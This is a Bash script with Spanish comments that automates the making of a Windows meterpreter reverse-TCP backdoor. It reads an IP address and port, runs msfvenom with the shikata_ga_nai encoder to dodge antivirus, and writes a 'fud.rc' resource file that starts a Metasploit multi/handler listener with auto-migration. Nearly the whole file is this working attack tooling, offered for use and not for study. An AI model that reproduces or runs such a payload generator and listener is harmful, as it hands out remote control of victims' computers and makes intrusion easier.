#!/bin/bash
#script para hacer mas simple todavia el payload en caso de urgencia, by Gonzalo Nuñez
#30/may/2017
clear
echo ' __________             _____________               ______            _________ '
echo ' ___  ____/_____ _________  /___  __ \_____ _____  ____  /___________ ______  / '
echo ' __  /_   _  __ `/_  ___/  __/_  /_/ /  __ `/_  / / /_  /_  __ \  __ `/  __  /  '
echo ' _  __/   / /_/ /_(__  )/ /_ _  ____// /_/ /_  /_/ /_  / / /_/ / /_/ // /_/ /   '
echo ' /_/      \__,_/ /____/ \__/ /_/     \__,_/ _\__, / /_/  \____/\__,_/ \__,_/    '
echo '                                          /____/                                '
echo '         _________                              _____                           '
echo '         __  ____/_____________________________ __  /______________             '
echo '         _  / __ _  _ \_  __ \  _ \_  ___/  __ `/  __/  __ \_  ___/             '
echo '         / /_/ / /  __/  / / /  __/  /   / /_/ // /_ / /_/ /  /                 '
echo '         \____/  \___//_/ /_/\___//_/    \__,_/ \__/ \____//_/                  '
echo '                                                                  @by Net       '
sleep 3 && clear
ifconfig wlan0 | grep inet
curl ipinfo.io/ip
echo
echo Escriba la ip LAN o WAN:
read ip
echo
echo Escriba el puerto:
read port
clear
echo se esta creando un payload con la ip $ip y el puerto $port aguarde por favor && sleep 3 && clear
echo Payload seleccionado msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -e x86/shikata_ga_nai -o /root/Desktop/new.exe && sleep 4 && clear
echo Creando payload  & sleep 0.1 && clear
echo cReando payload  & sleep 0.1 && clear
echo crEando payload  & sleep 0.1 && clear
echo creAndo payload  & sleep 0.1 && clear
echo creaNdo payload  & sleep 0.1 && clear
echo creanDo payload  & sleep 0.1 && clear
echo creandO payload  & sleep 0.1 && clear
echo creando Payload  & sleep 0.1 && clear
echo creando pAyload  & sleep 0.1 && clear
echo creando paYload  & sleep 0.1 && clear
echo creando payLoad  & sleep 0.1 && clear
echo creando paylOad  & sleep 0.1 && clear
echo creando payloAd  & sleep 0.1 && clear
echo creando payloaD  & sleep 0.1 && clear
echo Creando payload  & sleep 0.1 && clear
echo cReando payload  & sleep 0.1 && clear
echo crEando payload  & sleep 0.1 && clear
echo creAndo payload  & sleep 0.1 && clear
echo creaNdo payload  & sleep 0.1 && clear
echo creanDo payload  & sleep 0.1 && clear
echo creandO payload  & sleep 0.1 && clear
echo creando Payload  & sleep 0.1 && clear
echo creando pAyload  & sleep 0.1 && clear
echo creando paYload  & sleep 0.1 && clear
echo creando payLoad  & sleep 0.1 && clear
echo creando paylOad  & sleep 0.1 && clear
echo creando payloAd  & sleep 0.1 && clear
echo creando payloaD  & sleep 0.1 && clear
echo Creando payload  & sleep 0.1 && clear
echo cReando payload  & sleep 0.1 && clear
echo crEando payload  & sleep 0.1 && clear
echo creAndo payload  & sleep 0.1 && clear
echo creaNdo payload  & sleep 0.1 && clear
echo creanDo payload  & sleep 0.1 && clear
echo creandO payload  & sleep 0.1 && clear
echo creando Payload  & sleep 0.1 && clear
echo creando pAyload  & sleep 0.1 && clear
echo creando paYload  & sleep 0.1 && clear
echo creando payLoad  & sleep 0.1 && clear
echo creando paylOad  & sleep 0.1 && clear
echo creando payloAd  & sleep 0.1 && clear
echo creando payloaD  & sleep 0.1 && clear
echo Creando payload  & sleep 0.1 && clear
echo cReando payload  & sleep 0.1 && clear
echo crEando payload  & sleep 0.1 && clear
echo creAndo payload  & sleep 0.1 && clear
echo creaNdo payload  & sleep 0.1 && clear
echo creanDo payload  & sleep 0.1 && clear
echo creandO payload  & sleep 0.1 && clear
echo creando Payload  & sleep 0.1 && clear
echo creando pAyload  & sleep 0.1 && clear
echo creando paYload  & sleep 0.1 && clear
echo creando payLoad  & sleep 0.1 && clear
echo creando paylOad  & sleep 0.1 && clear
echo creando payloAd  & sleep 0.1 && clear
echo creando payloaD  & sleep 0.1 && clear
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -e x86/shikata_ga_nai -f exe -o /root/Desktop/new.exe
file /root/Desktop/new.exe |cut -d ':' -f2 && echo "Listo su payload se ha completado enjoy and Happy Hacking :3" && sleep 3 && clear 
touch fud.rc && rm fud.rc && touch fud.rc
echo use exploit/multi/handler >> fud.rc
echo set payload windows/meterpreter/reverse_tcp >> fud.rc
echo set lhost $ip >> fud.rc
echo set lport $port >> fud.rc
echo set AutoRunScript post/windows/manage/migrate >> fud.rc
echo set ExitOnSession false >> fud.rc
echo exploit -j -z >> fud.rc && sleep 0.2 && clear
service postgresql start
msfconsole -r fud.rc
